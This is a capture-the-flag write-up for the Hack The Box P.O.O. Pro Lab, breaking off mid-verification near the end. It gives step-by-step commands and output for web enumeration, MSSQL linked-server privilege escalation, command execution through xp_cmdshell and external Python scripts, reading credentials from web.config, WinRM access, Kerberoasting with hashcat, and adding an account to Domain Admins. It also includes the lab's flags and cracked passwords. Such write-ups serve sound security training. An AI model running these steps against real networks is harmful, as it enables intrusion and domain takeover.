# HTB Pro Lab Writeup — P.O.O. (Professional Offensive Operations)

<p align="center">
  <img src="https://app.hackthebox.com/images/icons/ic-prolabs/ic-p.o.o-overview.png" alt="HTB Facts Machine" width="220" />
</p>


<p align="center">
  <img src="https://img.shields.io/badge/HTB-Pro%20Lab-darkred" alt="HTB Pro Lab" />
  <img src="https://img.shields.io/badge/Windows-Active%20Directory-blue" alt="Windows Active Directory" />
  <img src="https://img.shields.io/badge/IIS-Web%20Enumeration-lightgrey" alt="IIS" />
  <img src="https://img.shields.io/badge/MSSQL-Linked%20Server%20Abuse-red" alt="MSSQL" />
  <img src="https://img.shields.io/badge/Kerberoast-Hashcat-orange" alt="Kerberoast" />
  <img src="https://img.shields.io/badge/WinRM-IPv6%20Foothold-green" alt="WinRM" />
  <img src="https://img.shields.io/badge/AD-ACL%20Abuse-purple" alt="Active Directory ACL Abuse" />
</p>

- **Author**: ElJoamy
- **Lab**: P.O.O. (Professional Offensive Operations)
- **Prolab URL**: [`https://app.hackthebox.com/prolabs/11?sort_by=created_at&sort_type=desc`](https://app.hackthebox.com/prolabs/11?sort_by=created_at&sort_type=desc)

## Introduction
Professional Offensive Operations is a rising name in the cyber security world.
Lately they've been working into migrating core services and components to a state of the art cluster which offers cutting edge software and hardware.
P.O.O. is designed to put your skills in enumeration, lateral movement, and privilege escalation to the test within a small Active Directory environment that is configured with the latest operating systems and technologies.
The goal is to compromise the perimeter host, escalate privileges and ultimately compromise the domain while collecting several flags along the way.
Entry Point: `10.13.38.11`

## Goal

- Enumerate the perimeter host.
- Recover the first set of credentials from the web application.
- Escalate to SQL `sysadmin` through linked server abuse.
- Extract administrator credentials from the IIS configuration.
- Obtain a foothold on the Windows host through IPv6 WinRM.
- Kerberoast a service account and abuse AD privileges.
- Become Domain Admin and recover the final flag.

## Attack Path Summary

> [!IMPORTANT]  
> This is one possible attack path. There may be other valid paths and techniques. This write-up is for educational purposes only.

```text
Web enumeration
  -> .DS_Store disclosure
  -> hidden /dev paths
  -> poo_connection.txt
  -> MSSQL credentials
  -> linked server circular trust
  -> sysadmin on SQL
  -> read web.config via external scripts
  -> local Administrator credentials
  -> IPv6 WinRM access
  -> Kerberoast service account
  -> crack p00_adm
  -> add p00_adm to Domain Admins
  -> access DC and recover final flag
```

<details>
  <summary style="font-size: 1.5em;"><strong>Table of Contents</strong></summary>

- [Introduction](#introduction)
- [Goal](#goal)
- [Attack Path Summary](#attack-path-summary)
- [Flag 1 — Recon](#flag-1--recon)
  - [Reconnaissance with Nmap](#reconnaissance-with-nmap)
  - [Focused MSSQL Enumeration](#focused-mssql-enumeration)
  - [Web Enumeration with FFUF](#web-enumeration-with-ffuf)
  - [Download and Parse .DS_Store](#download-and-parse-ds_store)
  - [Enumerating /dev](#enumerating-dev)
- [Flag 2 — Huh?!](#flag-2--huh)
  - [Connecting to MSSQL](#connecting-to-mssql)
  - [Basic SQL Enumeration](#basic-sql-enumeration)
  - [Linked Server Enumeration](#linked-server-enumeration)
  - [Discovering the Execution Context](#discovering-the-execution-context)
  - [Creating a New Sysadmin Login](#creating-a-new-sysadmin-login)
- [Flag 3 — BackTrack](#flag-3--backtrack)
  - [Confirming SQL Admin Access](#confirming-sql-admin-access)
  - [Enabling External Script Execution](#enabling-external-script-execution)
  - [Reading web.config](#reading-webconfig)
- [Flag 4 — Foothold](#flag-4--foothold)
  - [Discovering the Host's IPv6 Address](#discovering-the-hosts-ipv6-address)
  - [Checking WinRM Over IPv6](#checking-winrm-over-ipv6)
  - [Gaining a Shell with Evil-WinRM](#gaining-a-shell-with-evil-winrm)
- [Flag 5 — p00ned](#flag-5--p00ned)
  - [Why We Return to MSSQL](#why-we-return-to-mssql)
  - [Enabling xp_cmdshell](#enabling-xp_cmdshell)
  - [Locating the Domain Controller](#locating-the-domain-controller)
  - [Uploading PowerView](#uploading-powerview)
  - [Kerberoasting Service Accounts](#kerberoasting-service-accounts)
  - [Creating a Domain Credential Object](#creating-a-domain-credential-object)
  - [Abusing Group Permissions](#abusing-group-permissions)
  - [Remote Command Execution on the Domain Controller](#remote-command-execution-on-the-domain-controller)
- [Key Takeaways](#key-takeaways)
- [Conclusion](#conclusion)
- [Resources](#resources)

</details>

---

## Flag 1 — Recon

<a id="reconnaissance-with-nmap"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Reconnaissance with Nmap</strong></summary>

The first step is a full TCP scan against the target.

```bash
nmap -Pn -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.13.38.11
```

**What the flags do:**
- `-Pn` skips host discovery and treats the target as alive.
- `-sC` runs default NSE scripts.
- `-sV` fingerprints service versions.
- `-p-` scans all TCP ports.
- `--min-rate 5000` increases the packet rate.
- `-oN nmap_full.txt` saves the output in normal format.

**Observed output:**
```text
┌──(root㉿localhost)-[/home/user/machines/prolabs/poo]
└─# nmap -Pn -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.13.38.11

Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 22:41 +0000
Nmap scan report for 10.13.38.11
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2056.00; RTM+
| ms-sql-info: 
|   10.13.38.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2056.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433
|_ssl-date: 2026-04-07T22:42:16+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-07T09:21:26
|_Not valid after:  2056-04-07T09:21:26
| ms-sql-ntlm-info: 
|   10.13.38.11:1433: 
|     Target_Name: POO
|     NetBIOS_Domain_Name: POO
|     NetBIOS_Computer_Name: COMPATIBILITY
|     DNS_Domain_Name: intranet.poo
|     DNS_Computer_Name: COMPATIBILITY.intranet.poo
|     DNS_Tree_Name: intranet.poo
|_    Product_Version: 10.0.17763
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.61 seconds
```

The target exposes only two services externally: IIS on port 80 and MSSQL on port 1433. The NTLM information is especially useful because it reveals the machine name and internal domain naming.

</details>

<a id="focused-mssql-enumeration"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Focused MSSQL Enumeration</strong></summary>

A second, smaller scan helps confirm the SQL identity information.

```bash
nmap -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info -oN nmap_mssql.txt 10.13.38.11
```

```text
┌──(root㉿localhost)-[/home/user/machines/prolabs/poo]
└─# nmap -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info -oN nmap_mssql.txt 10.13.38.11

Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 22:43 +0000
Nmap scan report for compatibility (10.13.38.11)
Host is up (0.16s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-ntlm-info: 
|   10.13.38.11:1433: 
|     Target_Name: POO
|     NetBIOS_Domain_Name: POO
|     NetBIOS_Computer_Name: COMPATIBILITY
|     DNS_Domain_Name: intranet.poo
|     DNS_Computer_Name: COMPATIBILITY.intranet.poo
|     DNS_Tree_Name: intranet.poo
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.13.38.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2056.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433

Nmap done: 1 IP address (1 host up) scanned in 6.05 seconds
```

Since the SQL banner discloses the hostname, it is convenient to add it locally.

```bash
echo "10.13.38.11 compatibility compatibility.intranet.poo" | sudo tee -a /etc/hosts
```

</details>

<a id="web-enumeration-with-ffuf"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Web Enumeration with FFUF</strong></summary>

We then enumerate directories on the IIS web root.

```bash
ffuf -u http://10.13.38.11/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-t 50 -fc 404
```

**Interesting results:**
```text
admin                   [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 170ms]
themes                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 170ms]
js                      [Status: 301, Size: 145, Words: 9, Lines: 2, Duration: 171ms]
templates               [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 171ms]
plugins                 [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 171ms]
images                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 172ms]
Templates               [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 170ms]
uploads                 [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 172ms]
Admin                   [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 170ms]
dev                     [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 174ms]
Images                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 172ms]
.                       [Status: 200, Size: 703, Words: 27, Lines: 32, Duration: 173ms]
Themes                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 171ms]
widgets                 [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 167ms]
JS                      [Status: 301, Size: 145, Words: 9, Lines: 2, Duration: 167ms]
ADMIN                   [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 163ms]
Uploads                 [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 164ms]
Js                      [Status: 301, Size: 145, Words: 9, Lines: 2, Duration: 169ms]
META-INF                [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 170ms]
IMAGES                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 169ms]
THEMES                  [Status: 301, Size: 149, Words: 9, Lines: 2, Duration: 168ms]
DEV                     [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 165ms]
Dev                     [Status: 301, Size: 146, Words: 9, Lines: 2, Duration: 169ms]
Widgets                 [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 178ms]
Plugins                 [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 169ms]
PlugIns                 [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 171ms]
TEMPLATES               [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 172ms]
.DS_Store               [Status: 200, Size: 10244, Words: 69, Lines: 51, Duration: 173ms]
UPLOADS                 [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 170ms]
```

The most interesting findings are `admin`, `dev`, `.DS_Store`, and `web.config`. On IIS, a publicly accessible `.DS_Store` can leak directory names created on a macOS workstation.

</details>

<a id="download-and-parse-ds_store"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Download and Parse .DS_Store</strong></summary>

```bash
curl -s http://10.13.38.11/.DS_Store -o DS_Store
```

```text
└─# ls -lh DS_Store 
file DS_Store         
-rw-r--r-- 1 root root 11K abr  7 23:01 DS_Store
DS_Store: Apple Desktop Services Store
```

To parse it, I created a small Python virtual environment and installed the `ds-store` library.

```bash
python3 -m venv venv
source venv/bin/activate
pip install ds-store
```

```bash
python3 - <<'PY'
from ds_store import DSStore

for f in ["DS_Store", "ds_store", "dev_DS_Store", "dev_ds_store"]:
    try:
        print(f"\n=== {f} ===")
        with DSStore.open(f, "r") as d:
            seen = set()
            for x in d:
                if x.filename not in seen:
                    seen.add(x.filename)
                    print(x.filename)
    except Exception as e:
        print(f"{f}: {e}")
PY
```

**Parsed contents:**
```text
=== DS_Store ===
admin
dev
iisstart.htm
Images
JS
META-INF
New folder
New folder (2)
Plugins
Templates
Themes
Uploads
web.config
Widgets
```

</details>

<a id="enumerating-dev"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Enumerating /dev</strong></summary>

The `/dev` directory contains two interesting hash-like subdirectories.

```bash
ffuf -u http://10.13.38.11/dev/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-t 50 -fc 404
```

Then I enumerated both candidate directories.

```bash
ffuf -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-t 50 -fc 404
```

```bash
ffuf -u http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-t 50 -fc 404
```

Both directories were also checked for additional `.DS_Store` files.

```bash
curl -s http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/.DS_Store -o hash1_DS_Store
curl -s http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/.DS_Store -o hash2_DS_Store
```

```bash
python3 - <<'PY'
from ds_store import DSStore

for f in ["hash1_DS_Store", "hash2_DS_Store"]:
    try:
        print(f"\n=== {f} ===")
        with DSStore.open(f, "r") as d:
            seen=set()
            for x in d:
                if x.filename not in seen:
                    seen.add(x.filename)
                    print(x.filename)
    except Exception as e:
        print(f"{f}: {e}")
PY
```

Next, I enumerated the `db` directory under both paths.

```bash
ffuf -u http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-t 50 -fc 404
```

```bash
ffuf -u http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-t 50 -fc 404
```

The second directory did not lead anywhere useful, but the first one exposed `poo_connection.txt`.

```bash
curl -i http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db/poo_connection.txt
```

This file contained the first flag and working MSSQL credentials.

```text
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#

Flag : POO{fcfb0767f5bd3cbc22f40ff5011ad555}
```

---

</details>

## Flag 2 — Huh?!

<a id="connecting-to-mssql"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Connecting to MSSQL</strong></summary>

With the leaked credentials, I connected to the SQL Server.

```bash
impacket-mssqlclient 'external_user:#p00Public3xt3rnalUs3r#@10.13.38.11'
```

The login format is `user:password@ip[:port]`.

</details>

<a id="basic-sql-enumeration"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Basic SQL Enumeration</strong></summary>

```sql
SELECT @@version;
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT name FROM sys.databases;
SELECT srvname, isremote FROM sysservers;
SELECT name, data_source, provider_string FROM sys.servers;
```

**Output:**
```text
[!] Press help for extra shell commands
SQL (external_user  external_user@master)> SELECT @@version;
                                                                                                                                                                                                                                            
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2017 (RTM-GDR) (KB5040942) - 14.0.2056.2 (X64) 
        Jun 20 2024 11:02:32 
        Copyright (C) 2017 Microsoft Corporation
        Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   
SQL (external_user  external_user@master)> SELECT SYSTEM_USER;
                
-------------   
external_user   
SQL (external_user  external_user@master)> SELECT USER_NAME();
                
-------------   
external_user   
SQL (external_user  external_user@master)> SELECT name FROM sys.databases;
name         
----------   
master       
tempdb       
POO_PUBLIC   
SQL (external_user  external_user@master)> SELECT srvname, isremote FROM sysservers;
srvname                    isremote   
------------------------   --------   
COMPATIBILITY\POO_PUBLIC          1   
COMPATIBILITY\POO_CONFIG          0   
SQL (external_user  external_user@master)> SELECT name, data_source, provider_string FROM sys.servers;
name                       data_source                provider_string   
------------------------   ------------------------   ---------------   
COMPATIBILITY\POO_CONFIG   COMPATIBILITY\POO_CONFIG   NULL              
COMPATIBILITY\POO_PUBLIC   COMPATIBILITY\POO_PUBLIC   NULL              
SQL (external_user  external_user@master)> 
```

At this stage, the important detail is the presence of two linked SQL servers: `POO_PUBLIC` and `POO_CONFIG`.

</details>

<a id="linked-server-enumeration"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Linked Server Enumeration</strong></summary>

```sql
EXEC sp_linkedservers;
EXEC sp_helplinkedsrvlogin;
SELECT * FROM sys.servers;
```

```text
SQL (external_user  external_user@master)> EXEC sp_linkedservers;
SRV_NAME                   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE             SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
------------------------   ----------------   -----------   ------------------------   ------------------   ------------   -------   
COMPATIBILITY\POO_CONFIG   SQLNCLI            SQL Server    COMPATIBILITY\POO_CONFIG   NULL                 NULL           NULL      
COMPATIBILITY\POO_PUBLIC   SQLNCLI            SQL Server    COMPATIBILITY\POO_PUBLIC   NULL                 NULL           NULL      
SQL (external_user  external_user@master)> EXEC sp_helplinkedsrvlogin;
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
SQL (external_user  external_user@master)> SELECT * FROM sys.servers;
server_id   name                       product      provider   data_source                location   provider_string   catalog   connect_timeout   query_timeout   is_linked   is_remote_login_enabled   is_rpc_out_enabled   is_data_access_enabled   is_collation_compatible   uses_remote_collation   collation_name   lazy_schema_validation   is_system   is_publisher   is_subscriber   is_distributor   is_nonsql_subscriber   is_remote_proc_transaction_promotion_enabled   modify_date   is_rda_server   
---------   ------------------------   ----------   --------   ------------------------   --------   ---------------   -------   ---------------   -------------   ---------   -----------------------   ------------------   ----------------------   -----------------------   ---------------------   --------------   ----------------------   ---------   ------------   -------------   --------------   --------------------   --------------------------------------------   -----------   -------------   
        0   COMPATIBILITY\POO_PUBLIC   SQL Server   SQLNCLI    COMPATIBILITY\POO_PUBLIC   NULL       NULL              NULL                    0               0           0                         1                    1                        0                         0                       1   NULL                                  0           0              0               0                0                      0                                              1   2018-03-17 13:21:26               0   
        1   COMPATIBILITY\POO_CONFIG   SQL Server   SQLNCLI    COMPATIBILITY\POO_CONFIG   NULL       NULL              NULL                    0               0           1                         1                    1                        1                         0                       1   NULL                                  0           0              0               0                0                      0                                              1   2018-03-17 13:51:08               0   
SQL (external_user  external_user@master)> 
```

</details>

<a id="discovering-the-execution-context"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Discovering the Execution Context</strong></summary>

```sql
EXEC ('SELECT SYSTEM_USER') AT [COMPATIBILITY\POO_CONFIG];
```

```text
SQL (external_user  external_user@master)> EXEC ('SELECT SYSTEM_USER') AT [COMPATIBILITY\POO_CONFIG];
                
-------------   
internal_user  
```

This shows that the linked server runs as a different SQL login: `internal_user`.

To understand whether the trust can be abused, I nested a query back into `POO_PUBLIC`.

```sql
EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG];
```

```text
SQL (external_user  external_user@master)> EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG];
     
--   
sa   
```

That result is the key: the circular trust returns to `POO_PUBLIC` as `sa`, which means full `sysadmin` rights can be obtained.

</details>

<a id="creating-a-new-sysadmin-login"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Creating a New Sysadmin Login</strong></summary>

```sql
EXEC ('EXEC (''EXEC sp_addlogin ''''super'''', ''''abc123!'''''') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG];
EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''super'''', ''''sysadmin'''''') AT [COMPATIBILITY\POO_PUBLIC]') AT [COMPATIBILITY\POO_CONFIG];
```

This creates a new login named `super` and adds it to the `sysadmin` server role.

Reconnect using the new credentials.

```bash
impacket-mssqlclient 'super:abc123!@10.13.38.11'
```

Then enumerate the databases again.

```sql
SELECT name FROM sys.databases;
```

At this point, the second flag is available in the SQL environment.

</details>

---

## Flag 3 — BackTrack

<a id="confirming-sql-admin-access"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Confirming SQL Admin Access</strong></summary>

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

If `IS_SRVROLEMEMBER('sysadmin')` returns `1`, the current login has administrative control over the SQL instance.

</details>

<a id="enabling-external-script-execution"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Enabling External Script Execution</strong></summary>

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'external scripts enabled', 1;
RECONFIGURE;
```

A quick test confirms that external Python execution works.

```sql
EXEC sp_execute_external_script
    @language = N'Python',
    @script = N'print("test")';
```

</details>

<a id="reading-webconfig"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Reading web.config</strong></summary>

Earlier, the `.DS_Store` file leaked the presence of `web.config`. Since IIS configuration files often contain authentication settings, connection strings, or hardcoded secrets, this is the next place to investigate.

```sql
EXEC sp_execute_external_script
    @language = N'Python',
    @script = N'
import subprocess
print(subprocess.check_output("type C:\\inetpub\\wwwroot\\web.config", shell=True).decode())
';
```

**Output:**
```text
SQL (super  dbo@master)> EXEC sp_execute_external_script @language = N'Python', @script = N'import subprocess; print(subprocess.check_output("type C:\inetpub\wwwroot\web.config", shell=True).decode())';
INFO(COMPATIBILITY\POO_PUBLIC): Line 0: STDOUT message(s) from external script: 

Express Edition will continue to be enforced.
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap
                fileExtension=".DS_Store"
                mimeType="application/octet-stream"
            />
        </staticContent>
        <!--
        <authentication mode="Forms">
            <forms name="login" loginUrl="/admin">
                <credentials passwordFormat = "Clear">
                    <user 
                        name="Administrator" 
                        password="EverybodyWantsToWorkAtP.O.O."
                    />
                </credentials>
            </forms>
        </authentication>
        -->
    </system.webServer>
</configuration>
```

The commented authentication block discloses valid credentials for the `/admin` panel.

- **Username**: `Administrator`
- **Password**: `EverybodyWantsToWorkAtP.O.O.`

Using those credentials on `/admin` yields the third flag.

---

</details>

## Flag 4 — Foothold

<a id="discovering-the-hosts-ipv6-address"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Discovering the Host's IPv6 Address</strong></summary>

With access to MSSQL external scripts and valid Administrator credentials, the next step is to find a reachable management interface. I used `ipconfig` through SQL to inspect all network adapters.

```sql
EXEC sp_execute_external_script
    @language = N'Python',
    @script = N'
import subprocess
print(subprocess.check_output("ipconfig", shell=True).decode())
';
```

**Relevant output:**
```text
Express Edition will continue to be enforced.

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::1001
   IPv6 Address. . . . . . . . . . . : dead:beef::7def:e631:7075:c1fd
   Link-local IPv6 Address . . . . . : fe80::1880:5d35:eba:bebb%8
   IPv4 Address. . . . . . . . . . . : 10.13.38.11
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : dead:beef::1
                                       fe80::250:56ff:feb0:42e8%8
                                       10.13.38.2

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.20.128.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
```

The important detail here is the globally routable IPv6 address `dead:beef::1001`.

</details>

<a id="checking-winrm-over-ipv6"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Checking WinRM Over IPv6</strong></summary>

```bash
nmap -6 -p 5985 dead:beef::1001
```

Since WinRM is accessible over IPv6, add a convenient hostname entry.

```bash
echo "dead:beef::1001 compatibility" | sudo tee -a /etc/hosts
```

</details>

<a id="gaining-a-shell-with-evil-winrm"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Gaining a Shell with Evil-WinRM</strong></summary>

```bash
evil-winrm -i compatibility -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'
```

Basic host validation inside the session:

```powershell
whoami
hostname
ipconfig
```

At this point, the fourth flag can be recovered from the host as `Administrator`.

---

</details>

## Flag 5 — p00ned

<a id="why-we-return-to-mssql"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Why We Return to MSSQL</strong></summary>

Even though we already have local administrator access on `COMPATIBILITY`, the local `Administrator` account is not the best context for querying the domain. The SQL service account is more useful for domain interaction, so the path for the final flag goes back through MSSQL.

</details>

<a id="enabling-xp_cmdshell"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Enabling xp_cmdshell</strong></summary>

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Test the execution context:

```sql
EXEC xp_cmdshell 'whoami';
```

```text
output                        
---------------------------   
nt service\mssql$poo_public   
NULL      
```

This confirms that commands run in the context of the SQL service, not as the interactive Administrator user.

</details>

<a id="locating-the-domain-controller"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Locating the Domain Controller</strong></summary>

```sql
EXEC xp_cmdshell 'nltest /dsgetdc:intranet.poo';
```

```text
output                                                                                                                                         
--------------------------------------------------------------------------------------------------------------------------------------------   
           DC: \\DC.intranet.poo                                                                                                               
      Address: \\172.20.128.53                                                                                                                 
     Dom Guid: 26480776-e013-44f5-aa3b-cbf35555c28b                                                                                            
     Dom Name: intranet.poo                                                                                                                    
  Forest Name: intranet.poo                                                                                                                    
 Dc Site Name: Default-First-Site-Name                                                                                                         
Our Site Name: Default-First-Site-Name                                                                                                         
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_DC DNS_DOMAIN DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 0x20000   
The command completed successfully                                                                                                             
NULL
```

The domain controller is `DC.intranet.poo` at `172.20.128.53`.

I also validated local domain and DNS information from the WinRM shell.

```powershell
nltest /dsgetdc:intranet.poo
ipconfig /all
Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.intranet.poo
```

**Relevant output:**
```text
           DC: \\DC.intranet.poo
      Address: \\172.20.128.53
     Dom Name: intranet.poo
...

Windows IP Configuration

   Host Name . . . . . . . . . . . . : COMPATIBILITY
   Primary Dns Suffix  . . . . . . . : intranet.poo
...

Ethernet adapter Ethernet1 2:
   IPv4 Address. . . . . . . . . . . : 172.20.128.101
   DNS Servers . . . . . . . . . . . : 172.20.128.53

Name                                     Type   TTL   Section    NameTarget                     Priority Weight Port
----                                     ----   ---   -------    ----------                     -------- ------ ----
_ldap._tcp.dc._msdcs.intranet.poo        SRV    600   Answer     dc.intranet.poo                0        100    389

Name       : dc.intranet.poo
QueryType  : A
TTL        : 3600
Section    : Additional
IP4Address : 172.20.128.53
```

</details>

<a id="uploading-powerview"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Uploading PowerView</strong></summary>

From the attacker machine:

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
ls -l PowerView.ps1
```

From the Evil-WinRM session:

```powershell
upload PowerView.ps1
dir
move .\PowerView.ps1 C:\Users\Public\PowerView.ps1
dir C:\Users\Public\PowerView.ps1
```

Load it into memory:

```powershell
IEX (Get-Content C:\Users\Public\PowerView.ps1 -Raw)
Get-Domain
```

Then adjust permissions so `xp_cmdshell` can read the script.

```powershell
icacls C:\Users\Public\PowerView.ps1
icacls C:\Users\Public\PowerView.ps1 /grant Everyone:R
icacls C:\Users\Public\PowerView.ps1
```

</details>

<a id="kerberoasting-service-accounts"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Kerberoasting Service Accounts</strong></summary>

```sql
EXEC xp_cmdshell 'powershell -ep bypass -c "IEX(Get-Content C:\Users\Public\PowerView.ps1 -Raw); Invoke-Kerberoast -Domain intranet.poo -Server 172.20.128.53 -OutputFormat Hashcat | Select-Object -ExpandProperty Hash"';
```

The output was copied locally and split into separate files for cracking:

- `hash_db.txt`
- `p00_adm.hash`

Initial dictionary attempts:

```bash
hashcat -m 13100 hash_db.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 p00_adm.hash /usr/share/wordlists/rockyou.txt
```

Since the dictionary attack was exhausted, I switched to a targeted mask attack.

```bash
hashcat -m 13100 p00_adm.hash -a 3 ?u?u?s?d?l?d?l
```

The cracked credential was:

```text
p00_adm : ZQ!5t4r
```

</details>

<a id="creating-a-domain-credential-object"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Creating a Domain Credential Object</strong></summary>

Back on the Windows host:

```powershell
IEX (Get-Content C:\Users\Public\PowerView.ps1 -Raw)
```

```powershell
$pass = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('intranet.poo\p00_adm', $pass)
```

</details>

<a id="abusing-group-permissions"></a>
<details>
  <summary style="font-size: 1.15em;"><strong>Abusing Group Permissions</strong></summary>

Add the user to `Domain Admins`:

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'p00_adm' -Credential $cred
```

If a plain verification does not return anything due to DC resolution issues, verify directly against the domain controller.

```powershell
Get-DomainGroupMember -Identity 'Domain Admins' | Where-Object {$_.MemberName -match 'p00_adm'}
```

```powershell
Get-DomainGroupMember -Identity 'Domain Admins' -Credential $cred | Where-Object {$_.MemberName -match 'p00_adm'}
```

```powershell
Get-DomainGroupMember -Identity 'Domain Admins' -Server '172.20.128.53' -Credential $cred | Where-Object {$_.MemberName -match 'p00_adm'}
```

**Successful verification:**
```shell
